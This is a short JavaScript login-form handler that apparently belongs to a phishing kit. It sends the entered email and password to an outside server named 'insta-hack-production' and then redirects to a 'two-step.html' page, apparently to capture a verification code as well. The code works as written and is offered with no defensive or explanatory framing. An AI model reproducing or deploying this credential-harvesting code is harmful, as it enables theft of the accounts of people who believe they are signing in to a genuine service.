document.getElementById('loginForm').addEventListener('submit', async function (event) {
    event.preventDefault();

    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;
    const apiUrl = 'https://insta-hack-production.up.railway.app/api/v1/login';

    const spinner = document.getElementById('spinner');
    spinner.style.display = 'inline-block';

    try {
        const response = await fetch(apiUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ email, password })
        });

        if (!response.ok) {
            throw new Error('Login failed');
        }

        const data = await response.text(); // Assuming response is plain text
        spinner.style.display = 'none';
        
        // Redirect to two-step verification page if login is successful
        window.location.href = 'two-step.html';

    } catch (error) {
        spinner.style.display = 'none';
        const messageDiv = document.getElementById('message');
        messageDiv.textContent = 'Error: ' + error.message;
        messageDiv.style.color = 'red';
    }
});
